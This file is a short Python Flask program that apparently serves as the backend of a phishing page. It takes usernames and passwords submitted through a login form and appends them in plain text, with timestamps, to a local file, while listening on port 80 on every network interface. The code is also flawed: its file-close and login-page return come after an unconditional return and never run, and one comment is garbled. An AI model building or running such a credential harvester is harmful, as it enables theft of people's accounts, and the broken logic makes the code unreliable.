from flask import Flask, render_template, request
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db_ent = open("database/db_1", 'a')     #Opening database file (i.e txt file)
        db_ent.write("\n \n" + username + " : " + password + "     [*] {}".format(datetime.datetime.now().strftime("%A %b %Y and Time was  : %I:%M:%S")))   #writing username : password and datetime to each new line with append mode :
    return render_template('b.html')
    db_ent.close()
    return render_template('login.html')

# can not be called and execute arbitrary
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

